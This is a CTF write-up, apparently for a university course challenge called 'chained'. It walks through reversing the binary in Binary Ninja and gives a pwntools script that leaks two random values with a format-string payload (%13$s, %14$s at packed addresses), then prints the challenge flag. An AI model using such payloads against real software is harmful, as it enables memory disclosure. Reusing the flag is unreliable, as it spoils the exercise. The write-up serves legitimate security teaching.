# [chained](https://github.com/ace-lii/ctf_writeups/blob/main/code/format_strings/chained)

* Open ***Binary Ninja*** as usual. Examine the main function to understand the logic. It generates two random numbers below 1000, sums them, and compares the result with the input.
![](https://github.com/ace-lii/ctf_writeups/blob/main/img/chained1.png?raw=true)


* Determine where these two random numbers are stored in memory using Binary Ninja.

![](https://github.com/ace-lii/ctf_writeups/blob/main/img/chained3.png?raw=true)

* Calculate the sum as you obtain values from the "random1/2" addresses. Use ***pwntools*** to play around with the chained.

```
from pwn import *

rdn1 = 0x0804a080
rdn2 = 0x0804a088

i = 13 # why 13 can use similar bash used in task2
sum = 0
p = process("./chained")
name = p32(rdn1) + p32(rdn2) + b" %" + str(i).encode() + b"$s " + b" %" + str(i + 1).encode() + b"$s"

print("\n\n--------------index is {} name is {}".format(i, name))

try:
    while True:
        prompt = p.recvline()
        print("\nprompt {}".format(prompt))

        if b"What is your name?" in prompt:
            p.sendline(name)
            try:
                prompt = p.recvline().strip(b"\x80\xa0\x04\x08\x88\xa0\x04\x08").strip()
                rdn1_val = int(prompt.split(b" ")[0])
                rdn2_val = int(prompt.split(b" ")[2])
                sum = rdn1_val + rdn2_val
                print("sum = {} r1 = {} r2 ={}".format(sum, rdn1_val, rdn2_val))
            except:
                pass
        elif b"Im thinking" in prompt:
            p.sendline(str(sum).encode())
            print(p.recvall())
            break
        elif b"totally wrong" in prompt:
            print("Reached the end of interaction")
        else:
            continue

except EOFError:
    print("EOFError: Process exited unexpectedly")

p.close()
```


> ENROL_IN_COMP6477

 

 
